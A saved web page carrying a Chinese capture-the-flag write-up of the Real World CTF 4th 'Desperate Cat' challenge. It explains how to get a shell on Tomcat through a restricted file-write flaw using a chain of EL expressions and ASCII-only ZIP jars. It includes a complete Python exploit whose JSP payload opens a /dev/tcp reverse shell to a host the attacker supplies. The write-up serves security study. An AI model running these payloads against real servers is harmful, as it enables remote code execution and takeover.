        },
        function () {
            $(".header-pop-window").css("transform", "translate(0,-100%)");
            $(".header-pop-window-wrapper").css("visibility", "hidden");
        });
    if (!getLocalUserInfo()) {
        axios.get(api("user/status")).then(function (res) {
            if (res.status === 200) {
                saveLocalUserInfo(res.data);
                updateLoginStatus(getLocalUserInfo());
            }
        })
    }
    else {
        updateLoginStatus(getLocalUserInfo());
    }
    $('#app-logo').on('mouseover', function () {
        $(".app-qrcode").show();
    })
    $('#app-logo').on('mouseleave', function () {
        $(".app-qrcode").hide();
    })
</script>
<script>
    $('.prepare-online').click(function () {
        $('.alert-corner').show();
        $('.online-alter-notice').show();
        setTimeout(function () {
            $('.alert-corner').fadeOut();
            $('.online-alter-notice').fadeOut();
        }, 3000)
    });
</script>
<!--头部导航end--><style>
    .highslide-viewport-size {
        position: fixed;
        width: 100%;
        height: 100%;
        left: 0;
        top: 0;
    }
</style>
<script src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/jweixin-1.2.0.js.下载"></script>
<script src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/highslide.js.下载"></script>
<link rel="stylesheet" type="text/css" href="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/style(1).css">
<link href="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/jquery.mCustomScrollbar.min.css" rel="stylesheet">
<script src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/jquery.mCustomScrollbar.min.js.下载"></script>
<script src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/layer.js.下载"></script><main role="main" style="min-height:1000px;padding-top:76px;">
    <div class="container d-flex justify-content-between">
        <div class="row" style="width:100%">
            <div class="col col-xs-24 col-sm-24 col-md-24 col-lg-18">
                <div class="common-left-content-container article-detail" style="background-color:white;overflow:hidden;">
                    <h1>
                        RWCTF 4th Desperate Cat Writeup
                    </h1>
                    <p class="article-top-info" style="margin-bottom: 10px;position:relative;">
                            <span>
                                阅读量 &nbsp;&nbsp;
                                <b>121769</b>
                            </span>
                        <span style="color:#cccccc;margin-left:20px;margin-right:20px;">|</span>
                        <span>
                                                                                    </span>
                    </p><div class="hide-in-mobile-device" style="padding:6px 12px;; position:absolute;top:90px; right:0px;line-height:40px;overflow:hidden;width:300px;height:40px;">
                        <div style="background-color:#f2f2f2;transform:skew(30deg);height:45px;width:100%;top:0;right:-30;position:absolute;z-index:0"></div>
                        <div style="height:40px;width:100%;top:-3px;right:-35px;position:absolute;z-index:0;padding-top: 2px;">
                            <div class="bdsharebuttonbox bdshare-button-style0-16" data-tag="share_1" style="display:table-cell;vertical-align:midlle;" data-bd-bind="1646481072986">
                                        <span style="
                                                    font-weight: 800;
                                                    color: #999999;
                                                ">分享到：</span>
                                <img data-cmd="qzone" alt="QQ空间" src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t014ba42aad7714178d.png">
                                <img data-cmd="tsina" alt="新浪微博" src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t01f0d8694dda79069d.png">
                                <img data-cmd="weixin" alt="微信" src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t01e29062a5dcd13c10.png">
                                <img data-cmd="sqq" alt="QQ" src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t010d95bee6ba3edf60.png">
                                <img data-cmd="fbook" alt="facebook" src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t01a5e75c16cffcb0ba.png">
                                <img data-cmd="twi" alt="twitter" src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t01fc30c819f51e9cff.png">
                            </div>
                        </div>
                    </div>
                    <p></p>
                    <time class="article-date">发布时间：2022-01-26 15:30:51</time>
                                                            <div class="article-content">
                        


<p><a href="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t017cc8b48ccfc70887.jpg" class="highslide-img" onclick="return hs.expand(this);" target="_blank"><img class="wp-image-267152 aligncenter" alt="" width="608" height="281" data-original="https://p5.ssl.qhimg.com/t017cc8b48ccfc70887.jpg" src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t017cc8b48ccfc70887.jpg" style=""></a></p>
<p>&nbsp;</p>
<h2 name="h2-0" id="h2-0">概述</h2>
<p>在 Real World CTF 4th 中，我很荣幸再次作为出题人参与出题。我出了一道名叫Desperate Cat 的题目，考察的是在严苛条件下 Tomcat Web 目录写文件 getshell 的利用。</p>
<p>Desperate Cat 的出题灵感源自于我大哥 Noxxx 在某次渗透攻防项目中碰到的实际问题场景。但当时由于攻防项目节奏紧张，而且还有其他事情要处理，这个问题我们在当时并没有解决。在那之后我空闲下来时，定下心来再思考，终于是给搞定了，因此把它做成了 Real World CTF 题目。</p>
<p>作为读者，如果你没有参与此次 Real World CTF 4th，但是对 Java Web 漏洞利用感兴趣，那么不妨往下阅读，我相信你或多或少也能从其中收获到一些自己的思考和启发。</p>
<p>&nbsp;</p>
<h2 name="h2-1" id="h2-1">游戏开始</h2>
<p>Desperate Cat 和它改编来源的原系统漏洞场景是这样的（我在题目中基本上照搬了原系统的相关处理代码，尽可能地做到情景再现）：</p>
<p>1.服务端中间件是 Tomcat，可以往 Tomcat Web 目录下写文件；<br>
2.写入的文件名后缀可控、没有检查；<br>
3.写入的文件名前缀不可控，会被替换为随机字符串；<br>
4.可指定文件的写入目录，且写入文件时如果文件所在的目录不存在，会递归进行父目录的创建；<br>
5.写入的文件内容部分可控，且以字符串编码的形式写入（而非直接传递的字节流），并且前后有脏数据；<br>
6.写入的文件内容里如下特殊字符被进行 HTML 转义：</p>
<p><code>&amp; -&gt; &amp;amp;<br>
&lt; -&gt; &amp;lt;<br>
' -&gt; '`<br>
`&gt; -&gt; '<br>
" -&gt; &amp;quot;<br>
( -&gt; (<br>
) -&gt; )</code></p>
<p>要解决的问题就是，在这样的场景下，怎么 getshell，拿到服务器权限？<br>
P.S. 没有参加过 Real World CTF 4th 的读者建议看到这里不妨稍微暂停一会，先自己思考一番，如果是你要解决这个问题，你准备怎么做？</p>
<p>&nbsp;</p>
<h2 name="h2-2" id="h2-2">棘手的字符转义处理</h2>
<p>不难发现，这个问题棘手的地方主要是在于太多关键的字符被转义处理了，其中最重要的两类字符是尖括号和圆括号。</p>
<p>如果只是不能用尖括号，我们可以很轻易地通过 Tomcat 支持的 EL 表达式（Expression Language）来解决。</p>
<p>由于 EL 规范里规定默认会引入<strong> java.lang.*</strong> 下的包，所以可以直接取 Runtime 类执行命令：<br><code>${Runtime.getRuntime().exec(param.cmd)}</code></p>
<p>当然你也可以通过反射的形式来调用其他类的方法。<br>
EL 的解析不依赖于 JSP 文件的代码标记 <strong>&lt;%…%&gt;</strong>，因此可以规避尖括号。不过需要 web.xml 开启 EL 解析的支持才能执行，但这个问题不大，从 web.xml 2.4 规范版本开始后，默认都已经支持 EL 了。</p>
<p>如果只是不能用圆括号，问题也很简单，由于 Java 代码编译解析器会识别 Unicode 形式的编码，所以你可以在 JSP 代码块里直接一股脑把所有字符 Unicode 编码：</p>
<p><code>&lt;%\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0022\u0063\u0061\u006c\u0063\u0022\u0029\u003b%&gt;</code></p>
<p>然而现在的问题是尖括号和圆括号都用不了，那要怎么办呢？</p>
<p>&nbsp;</p>
<h2 name="h2-3" id="h2-3">Expression Language Chain</h2>
<p>我先说下我的思路。在我思考这个问题时，我的想法是从 Tomcat 对于 JSP 以及 EL 的解析执行上寻求突破：<br>
1.看 Tomcat JSP 中是否支持类似于 EL 这类具有动态执行能力的其他语法特性；<br>
2.看 EL 表达式中是否支持某些特殊编码，利用特殊编码将要转义的字符进行编码来绕过；<br>
3.看 EL 表达式中是否可能存在二次解析执行（类似于 Struts2 中之前表达式二次渲染注入的漏洞）；<br>
4.在不使用圆括号的情况下，通过 EL 表达式的取值、赋值特性，获取到某些关键的 Tomcat 对象实例，修改它们的属性，造成危险的影响；<br>
经过许久的尝试，最终我成功用第4个办法完成了利用，从 JSP EL 中自带解析的隐式对象出发，通过组合4个 EL 表达式链，完成了 RCE！</p>
<h3 name="h3-4" id="h3-4">
<a class="reference-link" name="%E4%BF%AE%E6%94%B9%20Session%20%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8%E8%B7%AF%E5%BE%84"></a>修改 Session 文件存储路径</h3>
<p>默认配置下，Tomcat 在关闭服务的时候，会将用户 Session 中的数据以序列化的形式持久存储到本地，这样下次 Tomcat 再启动的时候，能够从本地存储的 Session 文件中恢复先前的 Session 数据内容，避免造成用户 Session 还未到期就由于服务重启而失效。</p>
<p>Session 持久化存储文件的默认路径是在 work 应用目录下的 SESSIONS.ser<br><a href="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t01a9caa4dad7b5fc1d.png" class="highslide-img" onclick="return hs.expand(this);" target="_blank"><img class="aligncenter" alt="" width="474" height="317" data-original="https://p2.ssl.qhimg.com/t01a9caa4dad7b5fc1d.png" src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t01a9caa4dad7b5fc1d.png" style=""></a><br>
而通过执行以下 EL 表达式，就可以做到修改 Session 文件的存储路径：</p>
<p><code>${pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a}</code></p>
<p>由于 EL . 点号属性取值相当于执行对象的 getter 方法，= 赋值则等同于执行 setter 方法，因此这段表达式等同于执行：</p>
<p><code>pageContext.getServletContext().getClassLoader().getResources().getContext().getManager().setPathname(request.getParameter("a"));</code></p>
<p>然后再通过执行如下表达式，往 Session 里写数据：</p>
<p><code>${sessionScope[param.b]=param.c}</code></p>
<p>这样就可以做到让 Tomcat 正常停止服务时，往一个任意路径下的文件写入部分内容可控的字符串（这部分是不会有特殊字符过滤转义处理的）：</p>
<p><code>?a=/opt/tomcat/webapps/ROOT/session.jsp&amp;b=voidfyoo&amp;c=%3C%25out.println(123)%3B%25%3E</code></p>
<h3 name="h3-5" id="h3-5">
<a class="reference-link" name="%E4%BF%AE%E6%94%B9%20Context%20reloadable"></a>修改 Context reloadable</h3>
<p>除了 Tomcat 停止服务的时候会做 Session 持久化存储外，还有别的办法吗？<br>
其实是有的，通过查阅官方文档发现了这样一段话：<br>
Whenever Apache Tomcat is shut down normally and restarted, or when an application reload is triggered, the standard Manager implementation will attempt to serialize all currently active sessions to a disk file located via the pathname attribute. All such saved sessions will then be deserialized and activated (assuming they have not expired in the mean time) when the application reload is completed.</p>
<p>因此根据官方文档可以看出来，除了服务停止或者重启，还可以让部署的程序触发 reload 来做到。</p>
<p><a href="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t01b6d597391221b1a6.png" class="highslide-img" onclick="return hs.expand(this);" target="_blank"><img class="aligncenter" alt="" width="719" height="76" data-original="https://p0.ssl.qhimg.com/t01b6d597391221b1a6.png" src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t01b6d597391221b1a6.png" style=""></a></p>
<p>让 Tomcat 部署的程序进行 reload 需要满足两个条件：</p>
<p><a href="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t01155dee8508806aab.png" class="highslide-img" onclick="return hs.expand(this);" target="_blank"><img class="aligncenter" alt="" width="638" height="267" data-original="https://p2.ssl.qhimg.com/t01155dee8508806aab.png" src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t01155dee8508806aab.png" style=""></a></p>
<p>1.Context reloadable 配置为 true（默认是 false）；<br>
2.<strong>/WEB-INF/classes/ </strong>或者<strong> /WEB-INF/lib/</strong> 目录下的文件发生变化。<br>
由于 Context reloadable 默认是 false，要动态修改它可以通过执行：</p>
<p><code>${pageContext.servletContext.classLoader.resources.context.reloadable=true}</code></p>
<p>它等效于：</p>
<p><code>pageContext.getServletContext().getClassLoader().getResources().getContext().setReloadable(true);</code></p>
<p>而 <strong>/WEB-INF/classes/ </strong>或者 <strong>/WEB-INF/lib/ </strong>目录下的文件发生变化具体指的是满足以下任意一项：<br><strong>/WEB-INF/classes/ </strong>下已加载过的 class 文件内容发生了修改；<br><strong>/WEB-INF/lib/ </strong>下已加载过的 jar 文件内容发生了修改，或者写入了新的 jar 文件。<br>
由于场景中的文件写入漏洞本身可以指定目录，因此通过往 <strong>/WEB-INF/lib/</strong> 下写入一个任意的后缀名为 jar 的文件，哪怕内容无法被正常解析，在 Context reloadable 为 true 的情况下就会触发 reload。</p>
<p>通过 Context reload，就可以实现在不重启的情况下写入 Session 数据文件到任意路径，得到 webshell。</p>
<h3 name="h3-6" id="h3-6">
<a class="reference-link" name="%E4%BF%AE%E6%94%B9%20appBase%20%E7%9B%AE%E5%BD%95"></a>修改 appBase 目录</h3>
<p>问题解决了吗？其实还没有。<br>
通过前2步，当 Context reload 时，尽管确实会将我们构造的 Session 里的恶意数据写到本地 JSP，但由于我们写入的 Jar 文件不合法（前后存在脏数据），应用 Context 会 reload 失败，导致部署的这整个应用直接 404 无法访问！</p>
<p><code>${pageContext.servletContext.classLoader.resources.context.parent.appBase=param.d}</code></p>
<p>如果程序已经挂掉了，那写入的 webshell 也没作用了，毕竟都已经访问不到了。<br>
有办法补救吗，当然！在触发会造成网站瘫痪的 Context reload 之前，我们可以先通过执行 EL 表达式去修改整个 Tomcat 的 appBase 目录：</p>
<p><code>${pageContext.servletContext.classLoader.resources.context.parent.appBase=param.d}</code></p>
<p>它等效于执行：</p>
<p><code>pageContext.getServletContext().getClassLoader().getResources().getContext().getParent().setAppBase(request.getParameter("d"));</code></p>
<p>appBase 属性表示所有存放 webapp 的目录，它的值默认是 <strong>webapps</strong>。</p>
<p><a href="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t01ae4bed2525e6e803.png" class="highslide-img" onclick="return hs.expand(this);" target="_blank"><img class="aligncenter" alt="" data-original="https://p0.ssl.qhimg.com/t01ae4bed2525e6e803.png" src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t01ae4bed2525e6e803.png" style=""></a></p>
<p>假如我们通过 EL 表达式把它的值修改为系统根目录 / ，这时候会发生一个很神奇的事情，就是整个系统盘全部被映射到 Tomcat 上了，整个系统文件资源你都可以直接通过 Tomcat 去访问：</p>
<p><a href="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t013c61c06f3093eea5.png" class="highslide-img" onclick="return hs.expand(this);" target="_blank"><img class="aligncenter" alt="" width="553" height="301" data-original="https://p3.ssl.qhimg.com/t013c61c06f3093eea5.png" src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t013c61c06f3093eea5.png" style=""></a></p>
<p>这样的话，就算原来的应用因为 Context reload 失败而导致 404 失效，还有其他的目录都可供访问。只要把 Session 持久化的存储文件写到任意一个其他目录就好啦。<br>
Exploit<br>
最后将所有的 EL 表达式集合起来就得到了：</p>
<p><code>${pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a}</code><br><code>${sessionScope[param.b]=param.c}<br>
${pageContext.servletContext.classLoader.resources.context.reloadable=true}<br>
${pageContext.servletContext.classLoader.resources.context.parent.appBase=param.d}</code></p>
<p>也就是 Desperate Cat intended solution exploit:</p>
<p><code>#!/usr/bin/env python3</code><br>
​<br><code>import sys<br>
import time<br>
import requests<br>
​<br>
PROXIES = None<br>
​<br>
if __name__ == '__main__':<br>
target_url = sys.argv[1]    # e.g. http://47.243.235.228:39465/<br>
reverse_shell_host = sys.argv[2]<br>
reverse_shell_port = sys.argv[3]<br>
​</code><br><code>el_payload =** **r"""${pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a}<br>
${sessionScope[param.b]=param.c}<br>
${pageContext.servletContext.classLoader.resources.context.reloadable=true}<br>
${pageContext.servletContext.classLoader.resources.context.parent.appBase=param.d}"""<br>
reverse_shell_jsp_payload = r"""&lt;%Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "sh -i &gt;&amp; /dev/tcp/""" + reverse_shell_host + "/" + reverse_shell_port + r""" 0&gt;&amp;1"});%&gt;"""<br>
r = requests.post(url=f'{target_url}/export',<br>
data={<br>
'dir': '',<br>
'filename': 'a.jsp',<br>
'content': el_payload,</code><br><code>},<br>
proxies=PROXIES)<br>
shell_path = r.text.strip().split('/')[-1]<br>
shell_url = f'{target_url}/export/{shell_path}'<br>
r2 = requests.post(url=shell_url,<br>
data={<br>
'a': '/tmp/session.jsp',<br>
'b': 'voidfyoo',<br>
'c': reverse_shell_jsp_payload,<br>
'd': '/',<br>
},<br>
proxies=PROXIES)<br>
r3 = requests.post(url=f'{target_url}/export',</code><br><code>data={<br>
'dir': './WEB-INF/lib/',<br>
'filename': 'a.jar',<br>
'content': 'a',<br>
},<br>
proxies=PROXIES)<br>
time.sleep(10)  # wait a while<br>
r4 = requests.get(url=f'{target_url}/tmp/session.jsp', proxies=PROXIES)**</code></p>
<p>&nbsp;</p>
<h2 name="h2-7" id="h2-7">ASCII ZIP Exploit</h2>
<h3 name="h3-8" id="h3-8">
<a class="reference-link" name="%E5%88%B6%E4%BD%9C%20ASCII%20ZIP%20Jar"></a>制作 ASCII ZIP Jar</h3>
<p>Desperate Cat 最终由 WreckTheLine 和 Sauercloud 这两个战队的选手解出，出乎意料的是，他们用的办法核心思路和我的想法并不一样！<br>
由于程序对一些关键的特殊字符做了转义处理，而且前后都有脏数据、文件内容以字符串编码的形式写入，所以我起初在思考问题的时候想当然地觉得写入 Jar 文件到 <strong>/WEB-INF/lib/</strong> 目录下去加载执行是根本不可能的。但 WreckTheLine 和 Sauercloud 他们证明了这一点其实是完全可行的！</p>
<p>其实之前已经有人研究过如何使用 <strong>[A-Za-z0-9] </strong>范围内的字符去构造压缩数据：</p>
<p><a href="https://github.com/molnarg/ascii-zip">https://github.com/molnarg/ascii-zip</a><br><a href="https://github.com/Arusekk/ascii-zip">https://github.com/Arusekk/ascii-zip</a></p>
<p>WreckTheLine 和 Sauercloud 他们参考了相关的构造算法，构造出了所有字节都在 0-127 范围内、且不出现被转义字符的特殊 Jar 包，使得即使前后都有脏数据、且内容以字符串编码形式被写入，Java 仍然会认为它是一个有效的 Jar 包。</p>
<h3 name="h3-9" id="h3-9">
<a class="reference-link" name="%E4%BF%AE%E6%94%B9%20Context%20WatchedResource"></a>修改 Context WatchedResource</h3>
<p>写入有效的 Jar 包后仍然要考虑让应用重新加载的问题，这样才能引入 Jar 包。对于这个问题，WreckTheLine 和 Sauercloud 战队的选手也没有借助 EL 表达式，而是借助修改 Tomcat Context WatchedResource 来触发：<br>
WatchedResource – The auto deployer will monitor the specified static resource of the web application for updates, and will reload the web application if it is updated. The content of this element must be a string.</p>
<p>在 Tomcat 9 环境下，默认的 WatchedResource 包括：</p>
<p><code>WEB-INF/web.xml<br>
WEB-INF/tomcat-web.xml<br>
${CATALINA_HOME}/conf/web.xml</code></p>
<p>Tomcat 会有后台线程去监控这些文件资源，在 Tomcat 开启 autoDeploy 的情况下（此值默认为 true，即默认开启 autoDeploy），一旦发现这些文件资源的 lastModified 时间被修改，也会触发 reload：</p>
<p><a href="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t016df9d7f5db1bd9b1.png" class="highslide-img" onclick="return hs.expand(this);" target="_blank"><img class="aligncenter" alt="" width="548" height="208" data-original="https://p2.ssl.qhimg.com/t016df9d7f5db1bd9b1.png" src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t016df9d7f5db1bd9b1.png" style=""></a></p>
<p>由于应用本身没有 <strong>WEB-INF/tomcat-web.xml</strong> 配置文件， 因此通过利用程序本身的写文件漏洞，来创建一个 WEB-INF/tomcat-web.xml/ 目录，也可以让应用强行触发 reload，加载进先前写入的 Jar 包。</p>
<h3 name="h3-10" id="h3-10">
<a class="reference-link" name="%E6%9C%80%E5%90%8E%E4%B8%80%E6%AD%A5"></a>最后一步</h3>
<p>进行到这里，对于 WreckTheLine 和 Sauercloud 这两个战队的选手而言，已经能够写入有效的 Jar 包并触发重新加载，也就意味着只差最后一步了。</p>
<p>Sauercloud 战队的选手终于在最后借助了 EL 表达式。先构造 EL 表达式如下：</p>
<p><code>${applicationScope[param.a]=param.b}</code></p>
<p>然后发送请求：</p>
<p><code>?a=org.apache.jasper.compiler.StringInterpreter&amp;b=Pwn</code></p>
<p>相当于执行了：</p>
<p><code>pageContext.getServletContext().setAttribute("org.apache.jasper.compiler.StringInterpreter", "Pwn");</code></p>
<p>之后再访问 JSP 进行表达式解析的时候，就会触发类加载，加载先前写入在 Jar 中的恶意类，完成 RCE：</p>
<p><a href="https://p1.ssl.qhimg.com/t01eea68d33c362de66.png" class="highslide-img" onclick="return hs.expand(this);" target="_blank"><img class="aligncenter" alt="" width="551" height="169" data-original="https://p1.ssl.qhimg.com/t01eea68d33c362de66.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></a></p>
<p>而 WreckTheLine 战队的选手自始至终都没有借助 EL 表达式，他们把 JSP Webshell 放在先前构造的 Jar 包里的 META-INF/resources/ 目录，这样就能直接通过 Web 访问了！</p>
<p>&nbsp;</p>
<h2 name="h2-11" id="h2-11">后记</h2>
<p>这道题目算是我目前解决过的最复杂的问题之一，无论是我自己尝试解决这些问题的过程、还是赛后看到其他选手的解题办法，我都从中收获良多。也希望参与过比赛的选手或者作为读者的你们能从中有所启发 😀</p>
<p>&nbsp;</p>
<h2 name="h2-12" id="h2-12">参考资料</h2>
<p><a href="https://jakarta.ee/specifications/expression-language/4.0/jakarta-expression-language-spec-4.0.html">https://jakarta.ee/specifications/expression-language/4.0/jakarta-expression-language-spec-4.0.html</a><br><a href="https://docs.oracle.com/cd/E19316-01/819-3669/bnajh/index.html">https://docs.oracle.com/cd/E19316-01/819-3669/bnajh/index.html</a><br><a href="https://tomcat.apache.org/tomcat-8.5-doc/config/manager.html">https://tomcat.apache.org/tomcat-8.5-doc/config/manager.html</a><br><a href="https://tomcat.apache.org/tomcat-7.0-doc/config/context.html">https://tomcat.apache.org/tomcat-7.0-doc/config/context.html</a><br><a href="https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html">https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html</a><br><a href="https://github.com/molnarg/ascii-zip">https://github.com/molnarg/ascii-zip</a><br><a href="https://github.com/Arusekk/ascii-zip">https://github.com/Arusekk/ascii-zip</a><br><a href="https://tomcat.apache.org/tomcat-9.0-doc/config/context.html">https://tomcat.apache.org/tomcat-9.0-doc/config/context.html</a></p>


                    </div>
                    <section class="article-footer-label">
                        <div>
                                                         <div>
                                 本文由<b>长亭科技</b>原创发布
                                <br>转载，请参考<a href="https://www.anquanke.com/note/repost" target="_blank">转载声明</a>，注明出处：
                                <a href="https://www.anquanke.com/post/id/267124" target="_blank">https://www.anquanke.com/post/id/267124</a>
                                <br>安全客 - 有思想的安全新媒体
                            </div>
                                                     </div>
                    </section>
                    <section style="margin-top:18px;">
                                                    <a class="article-tag-primary" href="https://www.anquanke.com/tag/CTF" target="_blank">CTF</a>                     </section>
                    <section style="text-align:center;margin-top:40px;" class="hide-in-mobile-device">
                        <button onclick="likePost()" class="btn btn-primary btn-lg btn-like" style="min-width:100px;">
                            <i class="fa fa-thumbs-o-up" aria-hidden="true" style="margin-right:10px;"></i>
                                                            <span id="like_status">赞</span> <span id="like_count_area"> (
                                    <span id="like_count">7</span>)</span>
                                                    </button>
                        <button class="btn btn-danger btn-lg btn-favorite" style="min-width:100px;" onclick="favorite();"><i class="fa fa-heart" aria-hidden="true" style="margin-right:10px;"></i>收藏</button>
                    </section>
                    <section class="hide-in-mobile-device" style="text-align:center;margin-top:40px;border-top:1px #f7f7f7 solid;position:relative;line-height:40px;">
                        <div style="float:left;height:80px;line-height:80px;">
                            <a rel="noopener noreferrer" target="_blank" href="https://www.anquanke.com/member/122590" style="color:#333333">
                                <div>
                                    <div class="avatar" style="background-image: url(https://p2.ssl.qhimg.com/sdm/40_40_100/t012a2b2cc9165a693a.jpg);height:28px;width:28px;margin-top:28px;float:left;"></div>
                                    <div style="float:left;margin-left:5px;">
                                        <nobr>
                                                <span class="">长亭科技</span>                                             <span class="user_label verify_label">认证</span>                                         </nobr>
                                    </div>
                                </div>
                            </a>
                        </div>
                        <div class="bdsharebuttonbox bdshare-button-style0-16" data-tag="share_1" style="display:table-cell;vertical-align:midlle;float:right;margin-top:20px;" data-bd-bind="1646481072986">
                            <span style="font-weight: 800;color: #999999;">分享到：</span>
                            <img data-cmd="qzone" alt="QQ空间" src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t014ba42aad7714178d.png">
                            <img data-cmd="tsina" alt="新浪微博" src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t01f0d8694dda79069d.png">
                            <img data-cmd="weixin" alt="微信" src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t01e29062a5dcd13c10.png">
                            <img data-cmd="sqq" alt="QQ" src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t010d95bee6ba3edf60.png">
                            <img data-cmd="fbook" alt="facebook" src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t01a5e75c16cffcb0ba.png">
                            <img data-cmd="twi" alt="twitter" src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t01fc30c819f51e9cff.png">
                        </div>
                    </section>
                    <div>
                    </div>
                </div>
                <section style="margin-top:20px;" class="hide-in-mobile-device">
                    <div style="font-weight:bolder;position:relative;font-size:18px;">
                        <span style="color:#1dada7;font-weight:900;margin-right:6px;">|</span>推荐阅读
                        <div style="position:absolute;right:18px;top:14px;font-size:14px;">
                        </div>
                    </div>
                    <div class="row">
                                                    <div class="col col-6" style="padding:6px;">
                                <a href="https://www.anquanke.com/post/id/269015">
                                    <img src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t016553adbc5146eaae.png" class="rounded" style="width:100%;">
                                    <h6 style="margin-top:5px;width:100%;height: 40px;overflow: hidden">如何在链上复现安全漏洞？</h6>
                                    <time style="color:#999999">2022-03-04 14:30:50</time>
                                </a>
                            </div>
                                                    <div class="col col-6" style="padding:6px;">
                                <a href="https://www.anquanke.com/post/id/268989">
                                    <img src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t0131ddc65b14f84381.jpg" class="rounded" style="width:100%;">
                                    <h6 style="margin-top:5px;width:100%;height: 40px;overflow: hidden">APP渗透—Android 7.0 抓包</h6>
                                    <time style="color:#999999">2022-03-04 10:30:49</time>
                                </a>
                            </div>
                                                    <div class="col col-6" style="padding:6px;">
                                <a href="https://www.anquanke.com/post/id/269048">
                                    <img src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t017548b153171b4a7b.jpg" class="rounded" style="width:100%;">
                                    <h6 style="margin-top:5px;width:100%;height: 40px;overflow: hidden">博彩平台支付通道新趋势，虚拟货币成“新宠”</h6>
                                    <time style="color:#999999">2022-03-03 20:00:48</time>
                                </a>
                            </div>
                                                    <div class="col col-6" style="padding:6px;">
                                <a href="https://www.anquanke.com/post/id/268921">
                                    <img src="./RWCTF 4th Desperate Cat Writeup - 安全客，安全资讯平台_files/t0164f01c32965e5128.jpg" class="rounded" style="width:100%;">
                                    <h6 style="margin-top:5px;width:100%;height: 40px;overflow: hidden">透过安全事件看软件组成分析SCA</h6>
                                    <time style="color:#999999">2022-03-03 14:30:07</time>
                                </a>
                            </div>
                                            </div>
                </section>
                <div style="width:100%;" class="comment-area" id="comment">
                    <section style="margin-top:20px;">
                        <div style="font-weight:bolder;position:relative;font-size:18px;">
                            <span style="color:#1dada7;font-weight:900;margin-right:6px;">|</span>发表评论
                        </div>
                        <div class="comment-box">
                            <textarea id="comment-content" placeholder="发表你的评论吧"></textarea>
                            <div class="bottom-area">
                                <div style="float: left; display: none;" class="comment-login hide-in-mobile-device">
                                    <div style="float:left;height:28px;line-height:28px;margin-top: 2px;margin-left: 6px;">
                                        <a rel="noopener noreferrer" target="_blank" href="https://www.anquanke.com/member/122590" style="color:#333333">
                                            <div>
                                                <div class="avatar" style="height:28px;width:28px;float:left;"></div>
                                                <div style="float:left;margin-left:5px;">
                                                    <nobr>
                                                        <span class="nickname">
                                                        </span>
                                                    </nobr>
                                                </div>
                                            </div>
                                        </a>
                                    </div>
                                </div>
                                <div style="float:right;">
                                    <button class="btn btn-primary btn-sm" onclick="comment(false);">发表评论</button>
                                </div>
                            </div>
                        </div>
                    </section>
                    <section style="margin-top:40px;">
                        <div style="font-weight:bolder;position:relative;font-size:18px;">
                            <span style="color:#1dada7;font-weight:900;margin-right:6px;">|</span>评论列表
                        </div>
                        <div style="width: 100%; line-height: 180px; text-align: center; color: rgb(153, 153, 153); font-size: 15px;" id="comment-empty">
                            还没有评论呢，快去抢个沙发吧~
                        </div>
                        <ul style="padding:0px ;margin-top:20px;" id="comment-list"></ul>
                        <div id="loadButton" style="width: 100%; background-color: rgb(226, 226, 226); border-radius: 4px; text-align: center; padding: 7px; margin-top: 20px; color: rgb(102, 102, 102); cursor: pointer; display: none;" onclick="loadComment(false);">加载更多
                        </div>
                    </section>
                </div>
            </div>
            <!-- 侧边栏 -->
            <div class="col col-xs-0 col-sm-0 col-md-0 col-lg-6 hide-in-mobile-device">
